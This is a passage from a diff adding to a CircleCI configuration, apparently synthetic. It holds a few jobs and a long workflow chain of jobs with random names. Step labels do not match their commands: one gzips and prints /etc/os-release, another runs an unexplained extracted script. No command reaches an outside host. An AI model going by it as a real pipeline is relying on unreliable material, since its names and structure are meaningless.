+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: In case of drift aggregate the sensor readings
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; f() { while getopts ab: o; do echo "$o=${OPTARG:-}"; done; }; f -a -b 6; true ; } > /tmp/make/0.217.0.20
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '0.217.0.20'
+  PrepareRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/0.217.0.20 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  AnonymousUserRegistry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Compact the backup set until cleanup
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; gzip -c /etc/os-release >"${TMPDIR:-/tmp}/lemon_addon_tmp.gz" && gzip -cd "${TMPDIR:-/tmp}/lemon_addon_tmp.gz"; true ; } > /tmp/make/glacier_theta_atom
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'glacier_theta_atom'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/glacier_theta_atom 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+
+workflows:
+  main:
+    jobs:
+      - UK
+      - sam-smoke:
+          requires:
+            - UK
+      - psi_pred:
+          requires:
+            - UK
+      - RunPipeline:
+          requires:
+            - psi_pred
+      - rate82867:
+          requires:
+            - psi_pred
+      - edge-v6:
+          requires:
+            - rate82867
+      - panel--full:
+          requires:
+            - rate82867
+      - teh-ci-2:
+          requires:
+            - panel--full
+      - panWorkerRequest:
+          requires:
+            - panel--full
+      - nebula-ng:
+          requires:
+            - panWorkerRequest
+      - OPT_GENERATOR:
+          requires:
+            - panWorkerRequest
+      - WEB-540:
+          requires:
+            - OPT_GENERATOR
+      - Global-Pointer:
+          requires:
+            - OPT_GENERATOR
+      - validte:
+          requires:
+            - Global-Pointer
+      - user_flatten_line:
+          requires:
+            - Global-Pointer
+      - mike-8:
+          requires:
+            - user_flatten_line
+      - missData:
+          requires:
+            - user_flatten_line
+      - WEB-137:
+          requires:
+            - missData
+      - lnlam:
+          requires:
+            - missData
+      - validte-92:
+          requires:
+            - lnlam
+      - routes-get:
+          requires:
+            - lnlam
+      - Prepare_Staging6:
+          requires:
+            - routes-get
+      - stopOrigGraph:
+          requires:
+            - routes-get
+      - jul25-ship:
+          requires:
+            - stopOrigGraph
+      - barbaz:
+          requires:
+            - stopOrigGraph
+      - fix-edge-glitch:
+          requires:
+            - barbaz
+      - RD-END-TAB:
+          requires:
+            - barbaz
+      - fiona-push:
+          requires:
+            - RD-END-TAB
+      - stack-2022-09-15:
+          requires:
+            - RD-END-TAB
+      - cerberus:
+          requires:
+            - stack-2022-09-15
+      - l3g:
+          requires:
+            - stack-2022-09-15
+      - canary-v1:
+          requires:
+            - l3g
+      - Util_17197:
+          requires:
+            - l3g
+      - DEV_MERGE_7:
+          requires:
+            - Util_17197
+      - DateIndexPattern:
+          requires:
+            - Util_17197
+      - cerberus-beta:
+          requires:
+            - DateIndexPattern
+      - FormCanvasHandlerCur:
+          requires:
+            - DateIndexPattern
+      - fx-x:
+          requires:
+            - FormCanvasHandlerCur
+      - catEIpZYAvz
+      - sanity:
+          requires:
+            - catEIpZYAvz
+      - as_name:
+          requires:
+            - catEIpZYAvz
+      - java17-ship:
+          requires:
+            - as_name
+      - Pen:
+          requires:
+            - as_name
+      - helios-alpha:
+          requires:
+            - Pen
+      - blog-email-text:
+          requires:
+            - Pen
+      - fx-old:
+          requires:
+            - blog-email-text
+      - Guard-Path-Manifest:
+          requires:
+            - blog-email-text
+      - fx-alt:
+          requires:
+            - Guard-Path-Manifest
+      - saveMotorTax:
+          requires:
+            - Guard-Path-Manifest
+      - PrepareRelease:
+          requires:
+            - saveMotorTax
+      - AnonymousUserRegistry:
+          requires:
+            - saveMotorTax
+      - all-greens:
+          requires:
+            - AnonymousUserRegistry
+      - v14-25-50:
+          requires:
+            - AnonymousUserRegistry
+      - run-full-release-candidate:
+          requires:
+            - v14-25-50
+      - m_castleTile:
+          requires:
+            - v14-25-50
+      - go1-21-fmt:
+          requires:
+            - m_castleTile
+      - RULE_H:
+          requires:
+            - m_castleTile
+      - node20-fmt:
+          requires:
+            - RULE_H
+      - xcvbnmasdf:
+          requires:
+            - RULE_H
+      - tango-4:
+          requires:
+            - xcvbnmasdf
